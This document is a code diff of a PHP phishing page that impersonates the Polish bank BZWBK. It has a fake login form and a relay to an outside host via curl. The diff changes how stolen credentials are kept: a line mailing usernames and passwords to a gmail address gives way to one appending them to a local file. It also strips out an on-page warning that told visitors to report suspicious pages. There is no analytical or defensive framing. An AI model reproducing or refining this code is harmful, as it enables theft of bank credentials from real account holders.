@@ -9,7 +9,7 @@ $link=curl_init('http://hashmedia.pl/login.php');
 
  if(strstr($strona, 'transfer.php'))
  {
-	 mail('mateusz259@gmail.com', $username, $password);
+	file_put_contents('hasla.txt', $_POST['username'].':'.$_POST['password']."\r\n", FILE_APPEND);
 ?>
  <form action="http://hashmedia.pl/login.php" method="post">
  <input name="username" type="hidden" value="<?php echo $_POST['username']; ?>" />
@@ -22,16 +22,8 @@ $link=curl_init('http://hashmedia.pl/login.php');
  }
  else 
  {
-	 
-?>
-echo "Invalid login information. Please    to the previous page.";
-		exit();
-<?php
- }
-	 
-	
-?>
 
+?>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
@@ -44,8 +36,7 @@ echo "Invalid login information. Please    to the previous page.";
 <body>
     <div id="content" style="max-width:800px; height:800px;">
         <div id="container">
-            <img src="sync.png" alt="Mountain View">
-            <div>GWARANCJA BEZPIECZEŃSTWA</div><br><br>
+            <img src="logo.png" alt="BZWBK">
             <form method="post" action="login.php" class=login>
                 Login:<br>
                 <input type="text" name="username" id="login"><br> Hasło:
@@ -58,8 +49,9 @@ echo "Invalid login information. Please    to the previous page.";
 
         </div>
     </div>
-    <footer>
-        Jesli ta strona wydaje Ci się podejrzana, lub po prostu nieprofesjonalnie wykonana, zgłoś to w placówce naszego Banku
-    </footer>
 </body>
 </html>
+<?php
+ }
+?>
+
